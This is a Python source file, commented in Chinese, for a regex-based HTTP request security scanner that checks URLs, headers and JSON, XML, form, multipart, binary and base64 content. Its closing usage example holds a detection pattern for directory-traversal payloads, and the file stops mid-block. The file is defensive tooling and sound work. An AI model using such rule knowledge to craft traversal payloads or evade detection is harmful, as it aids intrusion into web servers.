import re
import sys
import yaml
from typing import Dict, List, Tuple, Optional, Union, Any
from urllib.parse import unquote, urlparse, parse_qs
import json
from dataclasses import dataclass, field
from enum import Enum
import xml.etree.ElementTree as ET
import base64
import functools
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import lru_cache


class SeverityLevel(Enum):
    """威胁严重性级别枚举"""
    CRITICAL = "严重"
    HIGH = "高危"
    MEDIUM = "中危"
    LOW = "低危"
    INFO = "信息"


def normalize_severity(value) -> SeverityLevel:
    """兼容 INFO/中/英文别名，避免静默落成错误等级。"""
    if isinstance(value, SeverityLevel):
        return value
    text = str(value or "").strip()
    if not text:
        return SeverityLevel.MEDIUM
    # 直接枚举值
    try:
        return SeverityLevel(text)
    except ValueError:
        pass
    lower = text.lower()
    aliases = {
        "critical": SeverityLevel.CRITICAL,
        "严重": SeverityLevel.CRITICAL,
        "high": SeverityLevel.HIGH,
        "高": SeverityLevel.HIGH,
        "高危": SeverityLevel.HIGH,
        "medium": SeverityLevel.MEDIUM,
        "中": SeverityLevel.MEDIUM,
        "中危": SeverityLevel.MEDIUM,
        "med": SeverityLevel.MEDIUM,
        "low": SeverityLevel.LOW,
        "低": SeverityLevel.LOW,
        "低危": SeverityLevel.LOW,
        "info": SeverityLevel.INFO,
        "information": SeverityLevel.INFO,
        "信息": SeverityLevel.INFO,
    }
    if lower in aliases:
        return aliases[lower]
    if text in aliases:
        return aliases[text]
    # 模糊包含
    for key, sev in (
        (("严重", "critical"), SeverityLevel.CRITICAL),
        (("高危", "high"), SeverityLevel.HIGH),
        (("中危", "medium"), SeverityLevel.MEDIUM),
        (("低危", "low"), SeverityLevel.LOW),
        (("信息", "info"), SeverityLevel.INFO),
    ):
        if any(k in lower or k in text for k in key):
            return sev
    return SeverityLevel.MEDIUM


@dataclass
class ScanResult:
    """扫描结果数据结构"""
    rule_type: str
    rule_name: str
    matched: str
    position: Tuple[int, int]
    context: str
    severity: SeverityLevel
    confidence: float = field(default=0.8)  # 置信度，0-1之间

def classify_input(input_string):
    """
    分析输入的字符串，判断它是URL路径还是完整的HTTP请求流量。
    """

    input_string = input_string.strip()

    # --- 规则1：检查多行和HTTP请求头 ---
    # "请求全流量" 必然是多行的，并且包含 "Key: Value" 格式的请求头
    if '\n' in input_string:
        lines = input_string.split('\n')

        # 检查第一行是否像HTTP请求行 (e.g., "GET /path HTTP/1.1")
        first_line_parts = lines[0].split(' ')
        methods = {'GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH'}

        # 检查是否有 "Key: Value" 格式的请求头
        has_headers = False
        if len(lines) > 1:
            # 使用正则表达式检查 "Host: www.example.com" 这样的格式
            if re.search(r'^[A-Za-z-]+:\s*.+', lines[1]):
                has_headers = True

        # 如果第一行有3个部分（方法, 路径, 协议）且有请求头，则为全流量
        if len(first_line_parts) == 3 and first_line_parts[0] in methods and has_headers:
            return "Full_HTTP", "请求全流量 (Full HTTP Request)"

    return "URL", "URL 路径和查询 (URL Path & Query)"





def parse_http_request(request_string):
    """
    解析一个原始的HTTP请求字符串。

    参数:
    request_string (str): 包含完整HTTP请求的字符串。

    返回:
    tuple: (path, headers, body)
           - path (str): 请求的路径 (例如 /js/utils.js)
           - headers (dict): 包含所有请求头的字典
           - body (str): 请求数据（请求体），如果没有则为空字符串
    """

    path = None
    headers = {}
    wrong = None

    # 检查是否有空行，空行是头和body的分隔符
    if '\r\n\r\n' in request_string:
        header_part, body = request_string.split('\r\n\r\n', 1)
    elif '\n\n' in request_string:
        header_part, body = request_string.split('\n\n', 1)
    else:
        # 没有分隔符，意味着没有body
        header_part = request_string
        body = ""

    # 按行分割头部
    header_lines = header_part.strip().split('\n')

    # 1. 解析请求行 (第一行)
    request_line = header_lines[0]
    try:
        method, path, protocol = request_line.split(' ')
    except ValueError:
        wrong=f"错误: 无法解析请求行: {request_line}"
        return None, {}, "",wrong

    # 2. 解析请求头 (第一行之后的所有行)

    for line in header_lines[1:]:
        # 确保行不为空
        if line.strip():
            try:
                # 按第一个冒号分割
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
            except ValueError:
                wrong = f"警告: 忽略格式不正确的头: {line}"

    headers={k.lower(): v for k, v in headers.items()}

    # 3. 返回路径、头、和数据
    return method,path, headers, body,wrong


class SecurityScanner:
    def __init__(self, config_path: str = 'config.yaml',JSON_rules=None, max_workers: int = 4, max_scan_depth: int = 10):
        """
        初始化安全扫描器，加载配置文件

        :param config_path: 配置文件路径
        :param max_workers: 最大并行工作线程数
        :param max_scan_depth: 最大扫描深度(用于递归扫描)
        """
        self.max_workers = max_workers
        self.max_scan_depth = max_scan_depth
        self._scan_cache = {}
        if JSON_rules!=None:
            self.config={'safety_testing':JSON_rules}
            self.compiled_rules = self._compile_rules()
            self._validate_config()
        else:
            try:
                with open(config_path, 'r', encoding='utf-8') as f:
                    self.config = yaml.safe_load(f)
                self.compiled_rules = self._compile_rules()
                self._validate_config()
            except FileNotFoundError:
                raise FileNotFoundError(f"配置文件 {config_path} 未找到")
            except yaml.YAMLError as e:
                raise ValueError(f"配置文件解析错误: {e}")

    def _load_rule_from_file(self, file_path: str) -> List[str]:
        """
        从规则文件加载规则，每行一个规则

        :param file_path: 规则文件路径
        :return: 规则列表
        """
        try:
            with open("lib/"+file_path, 'r', encoding='utf-8') as f:
                # 读取所有非空行，去除前后空白
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            print(f"警告: 规则文件 {file_path} 未找到")
            return []
        except Exception as e:
            print(f"警告: 加载规则文件 {file_path} 出错: {e}")
            return []


    def _validate_config(self):
        """验证配置文件结构是否正确"""
        if 'safety_testing' not in self.config:
            raise ValueError("配置文件中缺少 'safety_testing' 部分")

        for rule_type, rule_data in self.config['safety_testing'].items():
            if 'name' not in rule_data or 'rules' not in rule_data:
                raise ValueError(f"规则类型 {rule_type} 缺少 'name' 或 'rules' 字段")


    def _process_severities(self, severities: Union[str, List[str]], rule_count: int) -> List[SeverityLevel]:
        """处理严重性信息，确保与规则数量匹配"""
        if not severities:
            return [SeverityLevel.MEDIUM] * rule_count

        if isinstance(severities, str):
            return [normalize_severity(severities)] * rule_count

        processed = [normalize_severity(s) for s in severities]

        # 确保严重性列表长度与规则数量匹配
        if len(processed) < rule_count:
            processed.extend([SeverityLevel.MEDIUM] * (rule_count - len(processed)))
        elif len(processed) > rule_count:
            processed = processed[:rule_count]

        return processed

    def _compile_rules(self) -> Dict[str, List[Tuple[str, re.Pattern, 'SeverityLevel', Optional[List[str]]]]]:
        """
        编译所有正则表达式规则并添加严重性
        :return: 编译后的规则字典 {规则类型: [(规则名称, 编译后的正则, 严重性, 检测位置)]}
        """
        compiled = {}

        for rule_type, rule_data in self.config['safety_testing'].items():
            compiled[rule_type] = []

            rule_names = rule_data['name'] if isinstance(rule_data['name'], list) else [rule_data['name']]
            detection_locations = rule_data.get('detection_location', ['ALL'])
            if not isinstance(detection_locations, list):
                detection_locations = [detection_locations]

            # 获取规则列表
            rules = []
            if isinstance(rule_data['rules'], list):
                for rule in rule_data['rules']:
                    if isinstance(rule, str) and rule.endswith('.rule'):
                        rules.extend(self._load_rule_from_file(rule))
                    else:
                        rules.append(rule)
            elif isinstance(rule_data['rules'], str):
                if rule_data['rules'].endswith('.rule'):
                    rules.extend(self._load_rule_from_file(rule_data['rules']))
                else:
                    rules.append(rule_data['rules'])

            if not rules:
                continue



            # 获取严重性列表
            severities = self._process_severities(rule_data.get('severity', []), len(rules))

            # 若 rules 与 names 数量一致，按一一对应处理
            if len(rules) == len(rule_names):
                for name, rule, severity in zip(rule_names, rules, severities):
                    for location in detection_locations:
                        self._add_compiled_rule(compiled, rule_type, name, rule, severity, location)
            else:
                for rule, severity in zip(rules, severities):
                    for name in rule_names:
                        for location in detection_locations:
                            self._add_compiled_rule(compiled, rule_type, name, rule, severity, location)

        return compiled

    def _add_compiled_rule(self, compiled: dict, rule_type: str, name: str, rule: str, severity: SeverityLevel,
                           detection_location: Optional[str] = None):
        """编译单个规则并添加到字典中"""
        try:
            # 使用预编译的正则表达式
            pattern = re.compile(rule, re.IGNORECASE)
            compiled[rule_type].append((name, pattern, severity, detection_location))
        except re.error as e:
            print(f"警告: 规则 {rule_type} ({name}) 编译失败: {e}")

    def _should_scan_location(self, location: str, current_location: str) -> bool:
        """判断是否应该扫描当前位置，支持包含、排除和全量匹配"""
        if not location:
            return True  # 没有设置位置时默认检测

        cache_key = f"{location}|{current_location}"
        if cache_key in self._scan_cache:
            return self._scan_cache[cache_key]

        # 拆分规则条件
        conditions = location.split('|')
        include_all = False
        include_locations = set()
        exclude_locations = set()

        for cond in conditions:
            cond = cond.strip()
            if not cond:
                continue
            if cond.upper() == 'ALL':
                include_all = True
            elif cond.startswith('!'):
                exclude_locations.add(cond[1:])
            else:
                include_locations.add(cond)

        # 优先处理排除逻辑
        if current_location in exclude_locations:
            self._scan_cache[cache_key] = False
            return False

        # 启用了 ALL，且当前项未被排除
        if include_all:
            self._scan_cache[cache_key] = True
            return True

        # 若有包含条件，仅允许明确包含的项
        if include_locations:
            result = current_location in include_locations
            self._scan_cache[cache_key] = result
            return result

        # 若设置了排除项但无包含项，默认排除其他未命中项
        if exclude_locations:
            self._scan_cache[cache_key] = False
            return False

        # 没有任何限制条件 → 默认允许
        self._scan_cache[cache_key] = True
        return True

    def scan(self, input_str: str, scan_location: str = 'ALL', depth: int = 0) -> Dict[str, List[ScanResult]]:
        """
        扫描输入字符串，检测所有可能的安全威胁

        :param input_str: 要检测的输入字符串
        :param scan_location: 当前扫描的位置标识 (URI, headers, body等)
        :param depth: 当前扫描深度(用于防止无限递归)
        :return: 检测结果字典 {规则类型: [ScanResult]}
        """
        if depth > self.max_scan_depth:
            return {}

        results = {}
        matched_positions = set()  # 记录已匹配的位置

        # 如果是字节类型，尝试解码
        if isinstance(input_str, bytes):
            try:
                input_str = input_str.decode('utf-8')
            except UnicodeDecodeError:
                # 如果是二进制数据，尝试检测是否为可执行文件
                if self._is_binary_executable(input_str):
                    return {
                        'binary_executable': [ScanResult(
                            rule_type='binary',
                            rule_name='可执行文件上传',
                            matched='二进制可执行文件',
                            position=(0, len(input_str)),
                            context='检测到二进制可执行文件内容',
                            severity=SeverityLevel.HIGH,
                            confidence=0.9
                        )]
                    }
                input_str = str(input_str)

        # 使用线程池并行处理规则
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for rule_type, rules in self.compiled_rules.items():
                for name, pattern, severity, detection_location in rules:
                    # 处理 r_body 的特殊情况
                    effective_scan_location = "body" if scan_location == "r_body" else scan_location
                    if not self._should_scan_location(detection_location, effective_scan_location):
                        continue

                    futures.append(executor.submit(
                        self._scan_single_rule,
                        input_str,
                        scan_location,  # 保持原始 scan_location 传递
                        rule_type,
                        name,
                        pattern,
                        severity,
                        matched_positions
                    ))

            for future in as_completed(futures):
                rule_type, rule_results = future.result()
                if rule_results:
                    if rule_type not in results:
                        results[rule_type] = []
                    results[rule_type].extend(rule_results)

        # 检测Base64编码内容
        if depth < self.max_scan_depth:  # 限制递归深度
            base64_results = self._scan_base64_content(input_str, scan_location, depth + 1)
            self._merge_results(results, base64_results)

        return results
    def _scan_single_rule(self, input_str: str, scan_location: str, rule_type: str, name: str,
                          pattern: re.Pattern, severity: SeverityLevel, matched_positions: set):
        """扫描单个规则"""
        rule_results = []
        matches = pattern.finditer(input_str)
        for match in matches:
            # 检查是否已经匹配过这个位置
            match_span = match.span()
            if match_span in matched_positions:
                continue

            matched_positions.add(match_span)
            rule_results.append(ScanResult(
                rule_type=rule_type,
                rule_name=name,
                matched=match.group(),
                position=match_span,
                context=self._get_context(input_str, match),
                severity=severity
            ))

        return rule_type, rule_results

    @lru_cache(maxsize=1024)
    def _is_binary_executable(self, data: bytes) -> bool:
        """检测是否为二进制可执行文件(使用缓存优化)"""
        if len(data) < 4:
            return False

        # ELF文件头
        if data.startswith(b'\x7fELF'):
            return True

        # PE文件头 (DOS MZ header)
        if data.startswith(b'MZ'):
            return True

        # Mach-O文件头
        if data.startswith(b'\xfe\xed\xfa\xce') or data.startswith(b'\xfe\xed\xfa\xcf'):
            return True

        return False

    def _scan_base64_content(self, input_str: str, scan_location: str, depth: int) -> Dict[str, List[ScanResult]]:
        """扫描并解码Base64编码内容"""
        results = {}
        base64_pattern = re.compile(
            r'(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)')

        matches = base64_pattern.finditer(input_str)
        for match in matches:
            try:
                decoded = base64.b64decode(match.group()).decode('utf-8', errors='ignore')
                if len(decoded) > 10:  # 只解码长度足够的内容
                    decoded_results = self.scan(decoded, f"base64:{scan_location}", depth + 1)
                    if decoded_results:
                        for rule_type, matches in decoded_results.items():
                            for m in matches:
                                m.rule_name = f"Base64解码内容: {m.rule_name}"
                                m.context = f"Base64解码内容: {m.context}"
                        self._merge_results(results, decoded_results)
            except Exception:
                continue

        return results

    def _get_context(self, text: str, match: re.Match, context_len: int = 100) -> str:
        """获取匹配内容的上下文，使用 ^ 标记并在下一行添加解释"""
        start = max(0, match.start() - context_len)
        end = min(len(text), match.end() + context_len)

        line_start = text.rfind('\n', 0, match.start()) + 1
        line_end = text.find('\n', match.end())
        if line_end == -1:
            line_end = len(text)

        full_line = text[line_start:line_end]
        line_num = text.count('\n', 0, match.start()) + 1

        # 构造 ^ 标记和 ↑ 说明
        prefix_len = len(f'行 {line_num}: ')
        marker = '~' * (match.start() - line_start) + '^' * (match.end() - match.start())
        arrow_line = ' ' * (match.start() - line_start) + '↑ 匹配内容'

        return f"\n行 {line_num}: {full_line}\n{' ' * prefix_len}{marker}\n{' ' * prefix_len}{arrow_line}"

    def scan_url(self, url: str) -> Dict[str, List[ScanResult]]:
        """
        专门用于扫描URL的安全检测方法

        :param url: 要检测的URL
        :return: 检测结果
        """
        # 解码URL编码的字符
        decoded_url = unquote(url)

        # 将 URL 中的 '+' 替换为空格
        decoded_url = decoded_url.replace('+', ' ')

        # 解析URL各部分进行更细致的检查
        parsed = urlparse(decoded_url)

        # 扫描完整URL (URI部分)
        results = self.scan(decoded_url, "URI")

        # 单独扫描查询参数
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for param, values in query_params.items():
                param_results = self.scan(param, "URI_key")
                self._merge_results(results, param_results, f"URL参数键名称: {param}")
                for value in values:
                    param_results = self.scan(value, "URI_value")
                    self._merge_results(results, param_results, f"URL参数值: {param}")

        return results

    def scan_headers(self, headers: Dict[str, str]) -> Dict[str, List[ScanResult]]:
        """
        扫描HTTP请求头

        :param headers: HTTP请求头字典
        :return: 检测结果
        """
        results = {}
        for header, value in headers.items():
            header_results = self.scan(value, f"headers:{header}")
            self._merge_results(results, header_results, f"请求头: {header}")
            header_results = self.scan(value, f"ALL_headers")
            self._merge_results(results, header_results, f"请求头: {header}")
        return results


    def scan_body(self, body: Union[str, bytes], content_type: str = "",optional_parameters: Dict[str, Any] | None = None) -> Dict[str, List[ScanResult]]:

        """
        扫描HTTP请求体

        :param body: 请求体内容
        :param content_type: 内容类型 (如 application/json)
        :return: 检测结果
        """

        limit_size_mb = optional_parameters["Data_section_detection"].get("limit_size")
        limit_size_bytes = int(limit_size_mb * 1024 * 1024)
        print(limit_size_bytes)
        # === 判断请求体大小是否超过 0.5MB ===
        size = len(body.encode() if isinstance(body, str) else body)
        if size > limit_size_bytes:  # 0.5 MB
            return {}

        if optional_parameters is None:          # 兼容老调用
            optional_parameters = {}
        data_opts = optional_parameters.get("Data_section_detection", {})
        try:
            if not data_opts.get("enabled", True):   # 总开关
                return {}

            # 保留原始 content_type 供后续使用
            full_content_type = content_type.strip()
            if not content_type:
                return self.scan(body, "body")
            content_type = content_type.split(';')[0].strip().lower()
            if content_type == "application/json" and data_opts.get("json", True):
                return self.scan_json(body)
            elif (content_type == "application/xml" or content_type == "text/xml") and data_opts.get("xml", True):
                return self.scan_xml(body)
            elif content_type == "application/x-www-form-urlencoded" and data_opts.get("forms", True):
                return self.scan_form_data(body)
            elif content_type.startswith("multipart/form-data") and data_opts.get("multipart", True):
                return self.scan_multipart_form_data(body, full_content_type)
            elif content_type.startswith("binary") and data_opts.get("binary", True):
                return self.scan_binary(body)
            else:
                return self.scan(body, "body")
        except Exception as e:
            print(e)
            return {}

    def scan_json(self, json_str: Union[str, bytes]) -> Dict[str, List[ScanResult]]:
        """
        扫描JSON数据
        :param json_str: JSON格式字符串或字节
        :return: 检测结果
        """
        if isinstance(json_str, bytes):
            try:
                json_str = json_str.decode('utf-8')
            except UnicodeDecodeError:
                return self.scan(json_str, "json_body")

        try:
            data = json.loads(json_str)
            return self._scan_json_data(data)
        except json.JSONDecodeError:
            # 如果不是合法JSON，作为普通字符串扫描
            return self.scan(json_str, "json_body")

    def _scan_json_data(self, data: Union[dict, list, str], path: str = "", depth: int = 0) -> Dict[str, List[ScanResult]]:
        """
        递归扫描 JSON 数据结构，识别其中可能存在的敏感信息或异常内容

        参数:
            data (Union[dict, list, str]): JSON 格式的数据，可以是字典、列表或字符串

            path (str): 当前扫描字段所在的路径，用于标记匹配位置

            depth (int): 当前递归深度


        返回:
            Dict[str, List[ScanResult]]: 扫描结果字典

        """
        if depth > self.max_scan_depth:
            return {}

        results = {}

        # 1. 先对所有类型统一扫描其字符串表示
        str_repr = str(data)
        str_repr = str_repr.replace("'", '"')
        generic_results = self.scan(str_repr, "json_body", depth)
        self._merge_results(results, generic_results, f"字符串表示: {path or '[root]'}")

        # 情况 1：当前 data 是字典类型
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key

                # 对键名进行扫描
                key_results = self.scan(str(key), "json_key_body", depth)
                self._merge_results(results, key_results, f"JSON键名: {current_path}")

                if isinstance(value, (dict, list)):
                    # 如果值是嵌套结构，继续递归
                    self._merge_results(results, self._scan_json_data(value, current_path, depth + 1))
                else:
                    # 对值进行扫描
                    value_results = self.scan(str(value), "json_value_body", depth)
                    self._merge_results(results, value_results, f"JSON字段: {current_path}")

        # 情况 2：当前 data 是列表类型
        elif isinstance(data, list):
            for i, item in enumerate(data):
                current_path = f"{path}[{i}]"  # 构建路径，如 users[0]

                if isinstance(item, (dict, list)):
                    # 如果列表元素仍然是结构体，递归继续扫描
                    self._merge_results(results, self._scan_json_data(item, current_path, depth + 1))
                else:
                    # 如果是基础类型，直接扫描值
                    item_results = self.scan(str(item), "json_item_body", depth)
                    self._merge_results(results, item_results, f"JSON数组: {current_path}")

        return results

    def scan_xml(self, xml_str: Union[str, bytes]) -> Dict[str, List[ScanResult]]:
        """
        扫描XML数据

        :param xml_str: XML格式字符串或字节
        :return: 检测结果
        """
        if isinstance(xml_str, bytes):
            try:
                xml_str = xml_str.decode('utf-8')
            except UnicodeDecodeError:
                return self.scan(xml_str, "xml_body")

        try:
            # 先尝试解析XML
            root = ET.fromstring(xml_str)
            return self._scan_xml_element(root)
        except ET.ParseError:
            # 如果不是合法XML，作为普通字符串扫描
            return self.scan(xml_str, "xml_body")

    def _scan_xml_element(self, element: ET.Element, path: str = "", depth: int = 0) -> Dict[str, List[ScanResult]]:
        """递归扫描XML元素"""
        if depth > self.max_scan_depth:
            return {}

        results = {}
        current_path = f"{path}/{element.tag}" if path else element.tag

        # 还原成字符串
        xml_bytes = ET.tostring(element, encoding='utf-8')
        xml_str_restored = xml_bytes.decode('utf-8')

        # 1. 先对所有类型统一扫描其字符串表示
        str_repr = str(xml_str_restored).replace("'", '"')
        generic_results = self.scan(str_repr, "xml_body", depth)
        self._merge_results(results, generic_results, f"字符串表示: {path or '[root]'}")

        # 扫描属性
        for attr, value in element.attrib.items():
            attr_path = f"{current_path}/@{attr}"
            attr_results = self.scan(value, "xml_attribute_body", depth)
            self._merge_results(results, attr_results, f"XML属性: {attr_path}")

        # 扫描文本内容
        if element.text and element.text.strip():
            text_results = self.scan(element.text.strip(), "xml_value_body", depth)
            self._merge_results(results, text_results, f"XML文本: {current_path}")

        # 递归扫描子元素
        for child in element:
            self._merge_results(results, self._scan_xml_element(child, current_path, depth + 1))

        return results

    def scan_form_data(self, form_data: Union[str, bytes]) -> Dict[str, List[ScanResult]]:
        """
        扫描表单数据

        :param form_data: application/x-www-form-urlencoded 格式的数据
        :return: 检测结果

        """
        if isinstance(form_data, bytes):
            try:
                form_data = form_data.decode('utf-8')
            except UnicodeDecodeError:
                return self.scan(form_data, "forms_body")

        results = {}
        try:
            params = parse_qs(form_data)
            for param, values in params.items():
                param_results = self.scan(param, "json_key_body")
                self._merge_results(results, param_results, f"表单参数名: {param}")
                for value in values:
                    param_results = self.scan(value, "forms_value_body")
                    self._merge_results(results, param_results, f"表单参数: {param}")
        except Exception:
            # 如果解析失败，作为普通字符串扫描
            return self.scan(form_data, "forms_body")

        return results

    def scan_multipart_form_data(self, data: bytes, content_type: str) -> Dict[str, List['ScanResult']]:
        """
        增强版 multipart/form-data 格式数据扫描，包括：
        - 文件名检测（路径穿越、特殊扩展名）
        - 内容类型检测（MIME类型欺骗）
        - 文件内容检测（恶意代码、可执行文件）
        - 文件头验证（真实类型与声明类型对比）

        :param data: 原始二进制数据
        :param content_type: Content-Type头部，包含boundary
        :return: 检测结果字典
        """
        results = {}

        # 使用正则从 Content-Type 中提取 boundary（更健壮）
        match = re.search(r'boundary="?([^";\s]+)"?', content_type, re.IGNORECASE)
        boundary = match.group(1) if match else None

        if not boundary:
            # fallback：整个 body 按普通 multipart 扫描
            return self.scan(data, "multipart_body")
        try:
            data_bytes = data.encode('utf-8')
            # 分割各部分
            parts = data_bytes.split(b'--' + boundary.encode('utf-8'))

            for part in parts[1:-1]:  # 跳过首尾无效部分
                part = part.strip(b'\r\n')
                headers, _, body = part.partition(b'\r\n\r\n')
                header_text = headers.decode('utf-8', errors='ignore')

                # 1. 文件名检测
                file_name = self._extract_filename(header_text)

                if file_name:
                    # 检测路径穿越攻击
                    attr_results = self.scan(file_name, "multipart_file_name_body")
                    # 扫描文件名本身
                    self._merge_results(results,attr_results,"上传文件名: "+file_name)

                # 2. 内容类型检测
                content_type = self._extract_content_type(header_text)
                if content_type:
                    attr_results = self.scan(content_type, "multipart_content_type_body")
                    # 扫描文件名本身
                    self._merge_results(results,attr_results,"上传文件类型: "+content_type)


                # 3. 文件内容检测
                if body:
                    # 检测真实文件类型与声明类型是否一致
                    attr_results = self.scan(str(body), "multipart_data_body")
                    self._merge_results(results,attr_results,"检测文件上传数据")
        except Exception as e:
            print(f"解析multipart数据出错: {e}")
            return self.scan(str(data), "multipart_body")

        return results

    def _extract_filename(self, header_text: str) -> Optional[str]:
        """从头部提取文件名"""
        match = re.search(r'filename="([^"]+)"', header_text, re.IGNORECASE)
        return match.group(1) if match else None

    def _extract_content_type(self, header_text: str) -> Optional[str]:
        """从头部提取Content-Type"""
        match = re.search(r'Content-Type:\s*([^\r\n]+)', header_text, re.IGNORECASE)
        return match.group(1).strip() if match else None

    def _detect_real_file_type(self, data: bytes) -> Optional[str]:
        """通过文件头检测真实文件类型"""
        if len(data) < 4:
            return None

        # 常见文件类型的魔术数字
        file_signatures = {
            b'\x89PNG': 'image/png',
            b'\xff\xd8\xff': 'image/jpeg',
            b'GIF87a': 'image/gif',
            b'GIF89a': 'image/gif',
            b'\x25PDF': 'application/pdf',
            b'PK\x03\x04': 'application/zip',
            b'\x7fELF': 'application/x-executable',
            b'MZ': 'application/x-msdownload'
        }

        for sig, mime in file_signatures.items():
            if data.startswith(sig):
                return mime

        return None

    def _is_mime_match(self, declared: str, real: str) -> bool:
        """检查声明的MIME类型是否与实际类型匹配"""
        declared = declared.lower()
        real = real.lower()

        # 宽松匹配，主要类型相同即可
        if declared.split('/')[0] == real.split('/')[0]:
            return True

        # 特殊处理一些常见情况
        if 'octet-stream' in declared:
            return True

        # 图片类型通用检查
        if declared.startswith('image/') and real.startswith('image/'):
            return True

        return False

    def _scan_multipart_part(self, part: bytes) -> Dict[str, List[ScanResult]]:
        """扫描单个multipart部分"""
        results = {}

        # 分割头部和内容
        header_end = part.find(b'\r\n\r\n')
        if header_end == -1:
            return results

        headers_part = part[:header_end].decode('utf-8', errors='ignore')
        content = part[header_end + 4:]

        # 解析头部
        filename = None
        for line in headers_part.split('\r\n'):
            if line.lower().startswith('content-disposition:'):
                if 'filename=' in line.lower():
                    try:
                        filename = line.split('filename=')[1].strip('"\'')
                    except IndexError:
                        pass

        # 扫描文件名
        if filename:
            filename_results = self.scan(filename, "multipart:filename")
            self._merge_results(results, filename_results, "上传文件名")

        # 扫描内容
        if content:
            if self._is_binary_executable(content):
                results['binary_executable'] = [ScanResult(
                    rule_type='binary',
                    rule_name='可执行文件上传',
                    matched='二进制可执行文件',
                    position=(0, len(content)),
                    context='检测到二进制可执行文件内容',
                    severity=SeverityLevel.HIGH,
                    confidence=0.9
                )]
            else:
                try:
                    content_str = content.decode('utf-8')
                    content_results = self.scan(content_str, "multipart:content")
                    self._merge_results(results, content_results, "上传文件内容")
                except UnicodeDecodeError:
                    pass

        return results

    def scan_binary(self, data: str) -> Dict[str, List[ScanResult]]:
        """
        专用二进制数据扫描方法

        :param data: 二进制数据
        :return: 扫描结果
        """
        results = {}
        try:
            data_bytes = bytes.fromhex(data)
        except ValueError:
            return results

        # 1. 检查文件头特征
        file_signatures = {
            b'\xff\xfe': 'UTF-16 LE',
            b'\xfe\xff': 'UTF-16 BE',
            b'\xef\xbb\xbf': 'UTF-8 BOM',
            b'\x7fELF': 'ELF Executable',
            b'MZ': 'PE Executable'
        }

        for sig, sig_type in file_signatures.items():
            if data_bytes.startswith(sig):
                results['file_signature'] = [ScanResult(
                    rule_type='binary_header',
                    rule_name=f'文件头特征: {sig_type}',
                    matched=data_bytes[:len(sig)].hex(),
                    position=(0, len(sig)),
                    context=f'检测到 {sig_type} 文件头',
                    severity=SeverityLevel.MEDIUM
                )]
                break

        # 2. 检查UTF-16编码
        if data_bytes.startswith((b'\xff\xfe', b'\xfe\xff')):
            try:
                encoding = 'utf-16-le' if data_bytes.startswith(b'\xff\xfe') else 'utf-16-be'
                decoded = data_bytes.decode(encoding)
                decoded_results = self.scan(decoded, "binary_utf16")
                self._merge_results(results, decoded_results)
            except UnicodeDecodeError:
                pass

        # 3. 检查可打印字符比例
        printable_ratio = sum(b in range(32, 127) for b in data_bytes) / len(data_bytes)
        if printable_ratio > 0.7:
            results['high_printable'] = [ScanResult(
                rule_type='binary_content',
                rule_name='高可打印字符比例',
                matched=f'{printable_ratio:.1%}',
                position=(0, len(data_bytes)),
                context='二进制数据中包含大量可打印字符',
                severity=SeverityLevel.LOW
            )]

        # 4. 十六进制扫描
        hex_str = data_bytes.hex()
        hex_results = self.scan(hex_str, "binary_hex")
        self._merge_results(results, hex_results)

        return results

    def _merge_results(self, main_results: dict, new_results: dict, context: str = ""):
        """合并扫描结果"""
        if not new_results:
            return

        for rule_type, matches in new_results.items():
            if rule_type not in main_results:
                main_results[rule_type] = []

            # 添加上下文信息
            for match in matches:
                if context:
                    match.rule_name = f"{context} | {match.rule_name}"
                main_results[rule_type].append(match)

    def pretty_print_results(self, results: Dict[str, List[ScanResult]]) -> str:
        """
        美观地打印检测结果

        :param results: scan()方法返回的结果
        :return: 格式化后的结果字符串
        """
        if not results:
            return "✅ 未检测到安全威胁"

        output = []
        risk_types = set()

        for rule_type, matches in results.items():
            output.append(f"\n🔍 威胁类型: {rule_type.upper()}")
            for i, match in enumerate(matches, 1):
                risk_types.add(match.rule_name)
                output.append(f"  {i}. 规则: {match.rule_name}")
                output.append(f"     匹配内容: {match.matched}")
                output.append(f"     位置: {match.position}")
                output.append(f"     上下文: ...{match.context}...")
                output.append(f"     严重性: {match.severity.value} ({match.severity.name})")
                output.append(f"     置信度: {match.confidence * 100:.1f}%")

        summary = f"\n📊 检测摘要: 共发现 {len(results)} 类威胁, {sum(len(v) for v in results.values())} 处匹配"
        output.insert(0, summary)

        risk_type_summary = "威胁类型: " + " | ".join(risk_types)
        output.append(risk_type_summary)

        return "\n".join(output)

    def gui_pretty_print_results(self, results: Dict[str, List[ScanResult]]) -> str:
        """
        为GUI简化的结果输出

        :param results: scan()方法返回的结果
        :return: 简化的结果字符串
        """
        if not results:
            return "✅ 未检测到安全威胁"

        risk_types = set()
        for matches in results.values():
            for match in matches:
                risk_types.add(match.rule_name)

        return "威胁类型: " + " | ".join(risk_types)

    def get_results_stats(self, results: Dict[str, List[ScanResult]]) -> Dict[str, int]:
        """
        获取扫描结果的统计信息

        :param results: scan()方法返回的结果
        :return: 包含统计信息的字典
        """
        stats = {
            'total_matches': 0,
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0,
            'info': 0,
            'rule_types': set()
        }

        for rule_type, matches in results.items():
            stats['rule_types'].add(rule_type)
            stats['total_matches'] += len(matches)
            for match in matches:
                if match.severity == SeverityLevel.CRITICAL:
                    stats['critical'] += 1
                elif match.severity == SeverityLevel.HIGH:
                    stats['high'] += 1
                elif match.severity == SeverityLevel.MEDIUM:
                    stats['medium'] += 1
                elif match.severity == SeverityLevel.LOW:
                    stats['low'] += 1
                else:
                    stats['info'] += 1

        stats['rule_types'] = len(stats['rule_types'])
        return stats


# 使用示例
if __name__ == '__main__':
    # 初始化扫描器
    try:
        #scanner = SecurityScanner(config_path='config.yaml')
        scanner = SecurityScanner(JSON_rules={'Directory_Traversal_Attack': {'detection_location': ['URI|forms_key_body|multipart_file_name_body|ALL_headers|xml_value_body|!headers:referer'], 'name': ['路径遍历攻击 (/../) 或 (/.../)有效载荷'], 'rules': ['(?:(?:^|[\x5c/;])\.{2,3}[\x5c/;]|[\x5c/;]\.{2,3}[\x5c/;])'], 'severity': ['中危']}})
    except Exception as e:
